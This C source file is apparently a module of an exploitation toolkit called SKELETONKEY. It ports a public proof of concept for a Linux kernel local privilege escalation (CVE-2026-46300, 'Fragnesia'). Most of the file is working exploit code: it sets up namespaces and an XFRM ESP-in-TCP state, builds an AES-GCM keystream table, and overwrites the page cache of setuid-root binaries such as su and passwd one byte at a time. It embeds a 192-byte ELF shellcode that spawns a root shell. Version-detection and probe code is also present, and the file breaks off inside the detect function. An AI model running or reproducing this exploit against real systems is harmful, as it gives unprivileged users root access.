/*
 * fragnesia_cve_2026_46300 — SKELETONKEY module
 *
 * Fragnesia ("Fragment Amnesia", CVE-2026-46300) — XFRM ESP-in-TCP LPE.
 * skb_try_coalesce() fails to propagate the SKBFL_SHARED_FRAG marker
 * when moving paged fragments between buffers, so the kernel loses
 * track of the fact that a fragment is externally backed by page-cache
 * pages spliced in from a file. The ESP-in-TCP receive path then
 * decrypts in place, corrupting the page cache of a read-only file.
 *
 * The bug is a latent flaw exposed by the Dirty Frag remediation
 * (commit f4c50a4034e6) — see ROADMAP.md / CVES.md.
 *
 * This module is a faithful port of the public V12 security PoC
 * (xfrm_espintcp_pagecache_replace, github.com/v12-security/pocs/
 * fragnesia, William Bowling / V12). The exploit primitive — the
 * AES-GCM keystream-byte table, the per-byte IV selection, the
 * userns+netns+XFRM ESP-in-TCP setup, the splice-driven sender /
 * receiver trigger pair, the 192-byte ELF payload — is reproduced
 * from that PoC; see NOTICE.md.
 *
 * Port adaptations vs. the standalone PoC:
 *   - wrapped in the skeletonkey_module detect/exploit/cleanup interface
 *   - the PoC's ANSI "smash frame" TUI (draw_smash_frame + scroll-region
 *     escape sequences) is DROPPED; progress is logged with skeletonkey's
 *     [*]/[+]/[-] prefixes, gated on ctx->json
 *   - argv-driven target/offset/payload replaced with a fixed setuid
 *     carrier + the embedded 192-byte shellcode ELF
 *   - exploit() runs the PoC body in a forked child so its exit()/die()
 *     paths cannot tear down the skeletonkey dispatcher
 *   - honours ctx->no_shell; adds an --active probe that fires the
 *     primitive against a disposable /tmp file
 *
 * VERIFICATION STATUS: ported, NOT yet validated end-to-end on a
 * vulnerable-kernel VM. Requires CONFIG_INET_ESPINTCP and unprivileged
 * user-namespace creation. The fix commit is not yet pinned in this
 * module, so detect() does not do a version-based verdict — see
 * detect() and MODULE.md.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/utsname.h>

#ifdef __linux__

/* _GNU_SOURCE / _FILE_OFFSET_BITS are passed via -D in the top-level
 * Makefile; do not redefine here (warning: redefined). */
#include "../../core/kernel_range.h"
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#if __has_include(<linux/if_alg.h>)
#include <linux/if_alg.h>
#else
#include <linux/types.h>
struct sockaddr_alg {
	__u16 salg_family;
	__u8 salg_type[14];
	__u32 salg_feat;
	__u32 salg_mask;
	__u8 salg_name[64];
};
#endif
#include <linux/netlink.h>
#include <linux/udp.h>
#include <linux/xfrm.h>

#ifndef TCP_ULP
#define TCP_ULP 31
#endif
#ifndef NETLINK_XFRM
#define NETLINK_XFRM 6
#endif
#ifndef TCP_ENCAP_ESPINTCP
#define TCP_ENCAP_ESPINTCP 7
#endif
#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif
#ifndef ALG_SET_OP
#define ALG_SET_OP 3
#endif
#ifndef ALG_OP_ENCRYPT
#define ALG_OP_ENCRYPT 1
#endif
#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif
#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif
#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif

#define FRAG_LEN              4096
#define ESP_GCM_ICV_LEN       16
#define ESP_GCM_ENCRYPTED_LEN (FRAG_LEN - ESP_GCM_ICV_LEN)
#define TCP_PORT              5556
#define PAYLOAD_LEN           192

#define RECEIVER_PRE_ULP_US   30000
#define SENDER_PRE_SPLICE_US  1000
#define RECEIVER_POST_ULP_US  30000

/* fg_verbose gates step/status chatter; errors always print. */
static int fg_verbose = 1;
#define LOG(fmt, ...) do { if (fg_verbose) \
	fprintf(stderr, "[*] fragnesia: " fmt "\n", ##__VA_ARGS__); } while (0)
#define ERR(fmt, ...) fprintf(stderr, "[-] fragnesia: " fmt "\n", ##__VA_ARGS__)

static const char *const fg_targets[] = {
	"/usr/bin/su", "/bin/su", "/usr/bin/mount",
	"/usr/bin/passwd", "/usr/bin/chsh", NULL
};

/* --- exploit state (faithful to the V12 PoC) --- */

static const unsigned char xfrm_aead_key[20] = {
	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
	0x01, 0x02, 0x03, 0x04
};

static unsigned char active_esp_gcm_iv[8] = {
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
};
static uint32_t active_esp_seq = 1;
static const char *target_file;
static char target_file_buf[PATH_MAX];
static loff_t target_splice_off;

static uint16_t stream0_nonce[256];
static bool stream0_have[256];

static void die(const char *what)
{
	fprintf(stderr, "[-] fragnesia: %s: %s\n", what, strerror(errno));
	_exit(2);
}

static void gate_fail(const char *what)
{
	fprintf(stderr, "[-] fragnesia: namespace/XFRM gate closed: %s "
		"errno=%d (%s)\n", what, errno, strerror(errno));
	_exit(4);
}

static void store_be32(unsigned char *p, uint32_t v)
{
	p[0] = (unsigned char)(v >> 24);
	p[1] = (unsigned char)(v >> 16);
	p[2] = (unsigned char)(v >> 8);
	p[3] = (unsigned char)v;
}

/* --- AES-GCM keystream-byte table via AF_ALG ecb(aes) --- */

static int open_afalg_aes_ecb(void)
{
	struct sockaddr_alg sa = { .salg_family = AF_ALG };
	int fd = socket(AF_ALG, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("socket(AF_ALG)");
	strcpy((char *)sa.salg_type, "skcipher");
	strcpy((char *)sa.salg_name, "ecb(aes)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind AF_ALG ecb(aes)");
	if (setsockopt(fd, SOL_ALG, ALG_SET_KEY, xfrm_aead_key, 16) < 0)
		die("setsockopt AF_ALG key");
	return fd;
}

static void afalg_aes_encrypt_block(int alg_fd, const unsigned char in[16],
				    unsigned char out[16])
{
	char cbuf[CMSG_SPACE(sizeof(uint32_t))] = {0};
	struct iovec iov = { .iov_base = (void *)in, .iov_len = 16 };
	struct msghdr msg = {
		.msg_iov = &iov, .msg_iovlen = 1,
		.msg_control = cbuf, .msg_controllen = sizeof(cbuf),
	};
	struct cmsghdr *cmsg;
	uint32_t op = ALG_OP_ENCRYPT;
	int op_fd = accept4(alg_fd, NULL, NULL, SOCK_CLOEXEC);
	if (op_fd < 0)
		die("accept AF_ALG");
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_OP;
	cmsg->cmsg_len = CMSG_LEN(sizeof(op));
	memcpy(CMSG_DATA(cmsg), &op, sizeof(op));
	if (sendmsg(op_fd, &msg, 0) != 16)
		die("sendmsg AF_ALG block");
	if (read(op_fd, out, 16) != 16)
		die("read AF_ALG block");
	close(op_fd);
}

static unsigned char aes_gcm_stream0_byte(int alg_fd, const unsigned char iv[8])
{
	unsigned char counter_block[16], stream[16];
	memcpy(counter_block, &xfrm_aead_key[16], 4);
	memcpy(counter_block + 4, iv, 8);
	store_be32(counter_block + 12, 2);
	afalg_aes_encrypt_block(alg_fd, counter_block, stream);
	return stream[0];
}

static void build_stream0_table(void)
{
	unsigned char iv[8] = { 0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc };
	unsigned int count = 0, nonce;
	int alg_fd = open_afalg_aes_ecb();
	for (nonce = 0; nonce <= 0xffff && count < 256; nonce++) {
		unsigned char b;
		store_be32(iv + 4, nonce);
		b = aes_gcm_stream0_byte(alg_fd, iv);
		if (stream0_have[b])
			continue;
		stream0_have[b] = true;
		stream0_nonce[b] = (uint16_t)nonce;
		count++;
	}
	close(alg_fd);
	if (count != 256) {
		ERR("failed to build complete stream-byte table: %u/256", count);
		_exit(2);
	}
	LOG("stream0 table built (256 entries)");
}

static void choose_iv_for_stream0(unsigned char need_stream)
{
	uint16_t nonce = stream0_nonce[need_stream];
	memset(active_esp_gcm_iv, 0xcc, sizeof(active_esp_gcm_iv));
	store_be32(active_esp_gcm_iv + 4, nonce);
}

static unsigned char read_byte_at(const char *path, uint64_t off)
{
	unsigned char b;
	int fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open read byte");
	ssize_t ret = pread(fd, &b, 1, (off_t)off);
	if (ret < 0)
		die("pread byte");
	if (ret != 1) {
		ERR("short pread at offset=%llu", (unsigned long long)off);
		_exit(2);
	}
	close(fd);
	return b;
}

static uint64_t use_existing_target(const char *path)
{
	struct stat lst, st;
	if (lstat(path, &lst) < 0)
		die("lstat target");
	if (!S_ISREG(lst.st_mode)) {
		ERR("target is not a regular file");
		_exit(2);
	}
	if (stat(path, &st) < 0)
		die("stat target");
	if (st.st_size < FRAG_LEN) {
		ERR("target too small: size=%lld need>=%d",
		    (long long)st.st_size, FRAG_LEN);
		_exit(2);
	}
	if (snprintf(target_file_buf, sizeof(target_file_buf), "%s", path) >=
	    (int)sizeof(target_file_buf)) {
		ERR("target path too long");
		_exit(2);
	}
	target_file = target_file_buf;
	return (uint64_t)st.st_size;
}

static void verify_write_denied(const char *label)
{
	errno = 0;
	int fd = open(target_file, O_WRONLY | O_CLOEXEC);
	if (fd >= 0) {
		close(fd);
		ERR("permission boundary check failed: %s write-open succeeded "
		    "(target is writable — no exploit needed)", label);
		_exit(4);
	}
	LOG("permission boundary ok (%s: write denied, errno=%d)", label, errno);
}

/* --- userns / netns plumbing --- */

static int write_all_file_status(const char *path, const char *buf)
{
	size_t len = strlen(buf);
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	if (write(fd, buf, len) != (ssize_t)len) {
		int e = errno;
		close(fd);
		errno = e;
		return -1;
	}
	close(fd);
	return 0;
}

static void sync_write_byte(int fd)
{
	char c = 'M';
	if (write(fd, &c, 1) != 1)
		die("sync write");
	close(fd);
}

static void sync_read_byte(int fd)
{
	char c;
	if (read(fd, &c, 1) != 1)
		die("sync read");
	close(fd);
}

static void parent_map_write_or_exit(pid_t child, const char *name,
				     const char *data)
{
	char path[128];
	snprintf(path, sizeof(path), "/proc/%ld/%s", (long)child, name);
	if (write_all_file_status(path, data) < 0) {
		ERR("namespace gate closed: %s errno=%d (%s)",
		    path, errno, strerror(errno));
		kill(child, SIGKILL);
		waitpid(child, NULL, 0);
		_exit(4);
	}
}

static void enter_mapped_userns(void)
{
	uid_t outer_uid = getuid();
	gid_t outer_gid = getgid();
	int ready_pipe[2], mapped_pipe[2], status;
	char map[128];
	pid_t child;

	if (pipe(ready_pipe) < 0)
		die("pipe ready");
	if (pipe(mapped_pipe) < 0)
		die("pipe mapped");

	child = fork();
	if (child < 0)
		die("fork userns mapper");

	if (child > 0) {
		close(ready_pipe[1]);
		close(mapped_pipe[0]);
		sync_read_byte(ready_pipe[0]);
		snprintf(map, sizeof(map), "0 %u 1\n", outer_uid);
		parent_map_write_or_exit(child, "uid_map", map);
		parent_map_write_or_exit(child, "setgroups", "deny\n");
		snprintf(map, sizeof(map), "0 %u 1\n", outer_gid);
		parent_map_write_or_exit(child, "gid_map", map);
		sync_write_byte(mapped_pipe[1]);
		if (waitpid(child, &status, 0) < 0)
			die("wait userns child");
		if (WIFEXITED(status))
			_exit(WEXITSTATUS(status));
		if (WIFSIGNALED(status)) {
			ERR("userns child killed by signal %d", WTERMSIG(status));
			_exit(2);
		}
		_exit(2);
	}

	close(ready_pipe[0]);
	close(mapped_pipe[1]);
	if (unshare(CLONE_NEWUSER) < 0)
		gate_fail("unshare(CLONE_NEWUSER)");
	sync_write_byte(ready_pipe[1]);
	sync_read_byte(mapped_pipe[0]);
	if (setresgid(0, 0, 0) < 0)
		gate_fail("setresgid 0 in userns");
	if (setresuid(0, 0, 0) < 0)
		gate_fail("setresuid 0 in userns");
	LOG("userns: mapped to root (outer uid=%u gid=%u)", outer_uid, outer_gid);
}

static void bring_loopback_up(void)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		gate_fail("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
		gate_fail("SIOCGIFFLAGS lo");
	ifr.ifr_flags |= IFF_UP;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		gate_fail("SIOCSIFFLAGS lo up");
	close(fd);
}

static void add_nlattr(struct nlmsghdr *nlh, size_t maxlen,
		       unsigned short type, const void *data, size_t len)
{
	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
	struct nlattr *nla;
	if (off + NLA_HDRLEN + len > maxlen) {
		ERR("netlink message too small");
		_exit(2);
	}
	nla = (struct nlattr *)((char *)nlh + off);
	nla->nla_type = type;
	nla->nla_len = NLA_HDRLEN + len;
	memcpy((char *)nla + NLA_HDRLEN, data, len);
	nlh->nlmsg_len = off + NLA_ALIGN(nla->nla_len);
}

static int nl_ack_errno(char *buf, ssize_t len)
{
	struct nlmsghdr *nlh;
	struct nlmsgerr *err;
	for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
	     nlh = NLMSG_NEXT(nlh, len)) {
		if (nlh->nlmsg_type != NLMSG_ERROR)
			continue;
		err = (struct nlmsgerr *)NLMSG_DATA(nlh);
		if (err->error == 0)
			return 0;
		errno = -err->error;
		return -1;
	}
	errno = EPROTO;
	return -1;
}

static void add_xfrm_espintcp_state(void)
{
	char reqbuf[4096], resp[4096];
	char aeadbuf[sizeof(struct xfrm_algo_aead) + sizeof(xfrm_aead_key)];
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	struct xfrm_usersa_info *xs;
	struct xfrm_algo_aead *aead;
	struct xfrm_encap_tmpl encap;
	struct nlmsghdr *nlh;
	ssize_t ret;
	int fd;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh = (struct nlmsghdr *)reqbuf;
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*xs));
	nlh->nlmsg_type = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq = 1;

	xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	if (inet_pton(AF_INET6, "::1", &xs->saddr.in6) != 1)
		die("inet_pton saddr");
	if (inet_pton(AF_INET6, "::1", &xs->id.daddr.in6) != 1)
		die("inet_pton daddr");
	xs->id.spi = htonl(0x100);
	xs->id.proto = IPPROTO_ESP;
	xs->family = AF_INET6;
	xs->mode = XFRM_MODE_TRANSPORT;
	xs->reqid = 1;
	xs->lft.soft_byte_limit = XFRM_INF;
	xs->lft.hard_byte_limit = XFRM_INF;
	xs->lft.soft_packet_limit = XFRM_INF;
	xs->lft.hard_packet_limit = XFRM_INF;

	memset(aeadbuf, 0, sizeof(aeadbuf));
	aead = (struct xfrm_algo_aead *)aeadbuf;
	snprintf(aead->alg_name, sizeof(aead->alg_name), "rfc4106(gcm(aes))");
	aead->alg_key_len = sizeof(xfrm_aead_key) * 8;
	aead->alg_icv_len = 128;
	memcpy(aead->alg_key, xfrm_aead_key, sizeof(xfrm_aead_key));
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ALG_AEAD, aeadbuf, sizeof(aeadbuf));

	memset(&encap, 0, sizeof(encap));
	encap.encap_type = TCP_ENCAP_ESPINTCP;
	encap.encap_sport = htons(TCP_PORT);
	encap.encap_dport = htons(TCP_PORT);
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ENCAP, &encap, sizeof(encap));

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_XFRM);
	if (fd < 0)
		gate_fail("socket(NETLINK_XFRM)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		gate_fail("bind(NETLINK_XFRM)");
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	ret = sendto(fd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa));
	if (ret < 0)
		gate_fail("sendto XFRM_MSG_NEWSA");
	if (ret != (ssize_t)nlh->nlmsg_len) {
		errno = EIO;
		gate_fail("short sendto XFRM_MSG_NEWSA");
	}
	ret = recv(fd, resp, sizeof(resp), 0);
	if (ret < 0)
		gate_fail("recv XFRM ack");
	if (nl_ack_errno(resp, ret) < 0)
		gate_fail("XFRM_MSG_NEWSA ack");
	close(fd);
}

static void setup_user_netns_xfrm(void)
{
	if (prctl(PR_SET_DUMPABLE, 1, 0, 0, 0) < 0)
		die("prctl PR_SET_DUMPABLE");
	enter_mapped_userns();
	if (unshare(CLONE_NEWNET) < 0)
		gate_fail("unshare(CLONE_NEWNET)");
	bring_loopback_up();
	add_xfrm_espintcp_state();
	LOG("namespace + XFRM ESP-in-TCP state ready");
}

/* --- splice-driven trigger pair --- */

static void write_ready(int fd)
{
	char c = 'R';
	if (write(fd, &c, 1) != 1)
		die("ready write");
	close(fd);
}

static void wait_ready(int fd)
{
	char c;
	if (read(fd, &c, 1) != 1)
		die("ready read");
	close(fd);
}

static void receiver(int ready_write_fd)
{
	struct sockaddr_in6 addr = {
		.sin6_family = AF_INET6,
		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
		.sin6_port = htons(TCP_PORT),
	};
	char ulp[] = "espintcp";
	int fd, cfd, one = 1;

	fd = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("receiver socket");
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
		die("receiver reuseaddr");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("receiver bind");
	if (listen(fd, 1) < 0)
		die("receiver listen");

	write_ready(ready_write_fd);

	cfd = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
	if (cfd < 0)
		die("receiver accept");

	usleep(RECEIVER_PRE_ULP_US);
	if (setsockopt(cfd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp)) < 0)
		die("receiver TCP_ULP espintcp");
	usleep(RECEIVER_POST_ULP_US);
	close(cfd);
	close(fd);
	_exit(0);
}

static void sender(int ready_read_fd)
{
	struct sockaddr_in6 dst = {
		.sin6_family = AF_INET6,
		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
		.sin6_port = htons(TCP_PORT),
	};
	struct {
		__be16 len;
		unsigned char esp[16];
	} prefix;
	loff_t off;
	int fd, sock, p[2], one = 1;
	ssize_t ret, sent;

	wait_ready(ready_read_fd);

	memset(&prefix, 0xcc, sizeof(prefix));
	prefix.len = htons(sizeof(prefix) + FRAG_LEN);
	prefix.esp[0] = 0x00;
	prefix.esp[1] = 0x00;
	prefix.esp[2] = 0x01;
	prefix.esp[3] = 0x00;
	store_be32(&prefix.esp[4], active_esp_seq);
	memcpy(&prefix.esp[8], active_esp_gcm_iv, sizeof(active_esp_gcm_iv));

	fd = open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("sender open target");
	sock = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (sock < 0)
		die("sender socket");
	if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)) < 0)
		die("sender TCP_NODELAY");
	if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) < 0)
		die("sender connect");

	sent = send(sock, &prefix, sizeof(prefix), 0);
	if (sent != (ssize_t)sizeof(prefix))
		die("sender send prefix");

	usleep(SENDER_PRE_SPLICE_US);

	if (pipe(p) < 0)
		die("sender pipe");
	off = target_splice_off;
	ret = splice(fd, &off, p[1], NULL, FRAG_LEN, 0);
	if (ret != FRAG_LEN)
		die("sender splice file to pipe");
	ret = splice(p[0], NULL, sock, NULL, FRAG_LEN, 0);
	if (ret < 0)
		die("sender splice pipe to tcp");

	close(p[0]);
	close(p[1]);
	close(sock);
	close(fd);
	_exit(ret == FRAG_LEN ? 0 : 3);
}

static int run_trigger_pair(void)
{
	int pipefd[2], st_rx, st_tx;
	pid_t rx, tx;

	if (pipe(pipefd) < 0)
		die("pipe");

	rx = fork();
	if (rx < 0)
		die("fork receiver");
	if (rx == 0) {
		close(pipefd[0]);
		receiver(pipefd[1]);
	}

	tx = fork();
	if (tx < 0)
		die("fork sender");
	if (tx == 0) {
		close(pipefd[1]);
		sender(pipefd[0]);
	}

	close(pipefd[0]);
	close(pipefd[1]);
	if (waitpid(tx, &st_tx, 0) < 0)
		die("wait sender");
	if (waitpid(rx, &st_rx, 0) < 0)
		die("wait receiver");

	if (!WIFEXITED(st_tx) || WEXITSTATUS(st_tx) != 0 ||
	    !WIFEXITED(st_rx) || WEXITSTATUS(st_rx) != 0)
		return -1;
	return 0;
}

static uint64_t checked_byte_range_last(uint64_t byte_off, size_t byte_len)
{
	uint64_t n = (uint64_t)byte_len;
	if (n == 0) {
		ERR("byte range is empty");
		_exit(2);
	}
	if (n - 1 > UINT64_MAX - byte_off) {
		ERR("byte range overflows uint64_t");
		_exit(2);
	}
	return byte_off + n - 1;
}

/*
 * Replace [byte_off, byte_off+desired_len) in the page cache of
 * target_file with `desired`, one byte per ESP-in-TCP trigger.
 * Returns: 1 full payload verified, 0 fixed (byte never mutated),
 * 2 setup/range error, 3 bug present but payload not fully placed.
 */
static int replace_existing_bytes_after(uint64_t byte_off,
					const unsigned char *desired,
					size_t desired_len, uint64_t file_size)
{
	uint64_t last = checked_byte_range_last(byte_off, desired_len);
	size_t idx, changed = 0, skipped = 0;

	if (last >= file_size || last > file_size - FRAG_LEN) {
		ERR("byte range outside writable window: off=%llu len=%zu size=%llu",
		    (unsigned long long)byte_off, desired_len,
		    (unsigned long long)file_size);
		return 2;
	}

	build_stream0_table();
	LOG("smashing %zu bytes into the read-only page cache", desired_len);

	for (idx = 0; idx < desired_len; idx++) {
		uint64_t off = byte_off + idx;
		unsigned char current = read_byte_at(target_file, off);
		unsigned char final, need_stream;

		if (current == desired[idx]) {
			skipped++;
			continue;
		}

		target_splice_off = (loff_t)off;
		need_stream = current ^ desired[idx];
		choose_iv_for_stream0(need_stream);
		active_esp_seq++;

		if (run_trigger_pair() < 0) {
			ERR("trigger pair failed at index=%zu", idx);
			return 2;
		}

		final = read_byte_at(target_file, off);
		if (final == desired[idx]) {
			changed++;
			if (fg_verbose && (idx % 16 == 0 || idx + 1 == desired_len))
				fprintf(stderr, "[*] fragnesia:   +%04llx "
					"%02x -> %02x (%zu/%zu)\n",
					(unsigned long long)off, current, final,
					idx + 1, desired_len);
			continue;
		}
		if (final == current) {
			LOG("byte unchanged at +%llx — kernel appears patched",
			    (unsigned long long)off);
			return 0;
		}
		ERR("byte changed but mismatched desired at +%llx "
		    "(want %02x got %02x)", (unsigned long long)off,
		    desired[idx], final);
		return 3;
	}

	/* final verify pass */
	for (idx = 0; idx < desired_len; idx++) {
		if (read_byte_at(target_file, byte_off + idx) != desired[idx]) {
			ERR("final verify mismatch at index=%zu", idx);
			return 3;
		}
	}
	if (changed == 0) {
		LOG("all requested bytes already matched — nothing demonstrated");
		return 2;
	}
	LOG("payload verified in page cache (changed=%zu skipped=%zu)",
	    changed, skipped);
	return 1;
}

/* 192-byte ET_DYN ELF: setuid/setgid/seteuid(0) + execve("/bin/sh").
 * Reproduced verbatim from the V12 PoC. */
static const uint8_t shell_elf[PAYLOAD_LEN] = {
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
	0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
	0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

static const char *fg_pick_target(void)
{
	for (int i = 0; fg_targets[i]; i++) {
		struct stat sb;
		if (stat(fg_targets[i], &sb) == 0 &&
		    (sb.st_mode & S_ISUID) && sb.st_uid == 0 &&
		    sb.st_size >= FRAG_LEN && access(fg_targets[i], R_OK) == 0)
			return fg_targets[i];
	}
	return NULL;
}

static void fg_evict(const char *path)
{
	int fd = open(path, O_RDONLY);
	if (fd >= 0) {
#ifdef POSIX_FADV_DONTNEED
		posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
#endif
		close(fd);
	}
	int dc = open("/proc/sys/vm/drop_caches", O_WRONLY);
	if (dc >= 0) { if (write(dc, "3\n", 2) < 0) {} close(dc); }
}

/* --- precondition check: unprivileged user namespaces --- */

static bool fg_userns_allowed(void)
{
	pid_t pid = fork();
	if (pid < 0)
		return false;
	if (pid == 0)
		_exit(unshare(CLONE_NEWUSER) == 0 ? 0 : 1);
	int st;
	waitpid(pid, &st, 0);
	return WIFEXITED(st) && WEXITSTATUS(st) == 0;
}

/* ---- detect ------------------------------------------------------- */

/*
 * Active probe: run the full ESP-in-TCP primitive against a disposable
 * /tmp file. Returns 1 vulnerable, 0 not, -1 probe error. Forks so the
 * PoC's exit()/die() paths stay contained.
 */
static int fg_active_probe(void)
{
	char probe[] = "/tmp/skeletonkey-fragnesia-probe-XXXXXX";
	int fd = mkstemp(probe);
	if (fd < 0)
		return -1;
	unsigned char filler[8192];
	memset(filler, 0x5a, sizeof(filler));
	if (write(fd, filler, sizeof(filler)) != (ssize_t)sizeof(filler)) {
		close(fd); unlink(probe); return -1;
	}
	fsync(fd);
	close(fd);

	int result = -1;
	pid_t pid = fork();
	if (pid == 0) {
		/* one-byte payload differing from the 0x5a filler */
		static const unsigned char want[1] = { 0xa5 };
		use_existing_target(probe);
		setup_user_netns_xfrm();
		int rc = replace_existing_bytes_after(0, want, 1, 8192);
		_exit(rc == 1 ? 0 : (rc == 0 ? 10 : 2));
	}
	if (pid > 0) {
		int st;
		waitpid(pid, &st, 0);
		if (WIFEXITED(st)) {
			if (WEXITSTATUS(st) == 0)       result = 1;
			else if (WEXITSTATUS(st) == 10) result = 0;
			else                            result = -1;
		}
	}
	unlink(probe);
	return result;
}

/*
 * CVE-2026-46300 is a latent skb_try_coalesce() bug exposed by the
 * Dirty Frag remediation (commit f4c50a4034e6) which landed in Linux
 * 7.0. The Fragnesia fix shipped in the 7.0.x stable series at 7.0.9
 * per Debian's tracker (linux unstable: 7.0.9-1 fixed). Older Debian
 * stable branches (bullseye 5.10, bookworm 6.1, trixie 6.12) are
 * still marked vulnerable as of 2026-05-22 — backports may follow.
 *
 * The detect logic:
 *   - kernel ≥ 7.0.9    → patched on the 7.0.x branch
 *   - kernel on 5.10/6.1/6.12 (other branches without a backport
 *                          entry in this table) → version says
 *                          VULNERABLE; --active confirms empirically
 *   - --active         → empirical override (catches distro silent
 *                          backports and unfixed 7.0.x ≤ 7.0.8)
 *
 * Stable-branch backports for 5.10 / 6.1 / 6.12 — when they ship —
 * extend the table with the matching {major, minor, patch} entry.
 */
static const struct kernel_patched_from fragnesia_patched_branches[] = {
	{7, 0, 9},   /* mainline + 7.0.x stable: fix lands at 7.0.9 */
};
static const struct kernel_range fragnesia_range = {
	.patched_from = fragnesia_patched_branches,
	.n_patched_from = sizeof(fragnesia_patched_branches) /
			  sizeof(fragnesia_patched_branches[0]),
};

static skeletonkey_result_t fg_detect(const struct skeletonkey_ctx *ctx)
{
	fg_verbose = !ctx->json;

	struct kernel_version v;
	if (!kernel_version_current(&v)) {
		if (!ctx->json)
			fprintf(stderr, "[!] fragnesia: could not parse kernel version\n");
		return SKELETONKEY_TEST_ERROR;
	}

	if (!fg_userns_allowed()) {
		if (!ctx->json)
			fprintf(stderr, "[i] fragnesia: unprivileged user "
				"namespaces are disabled — XFRM gate closed "
				"here (CAP_NET_ADMIN unreachable)\n");
		return SKELETONKEY_PRECOND_FAIL;
	}

	if (!fg_pick_target()) {
		if (!ctx->json)
			fprintf(stderr, "[i] fragnesia: no readable setuid-root "
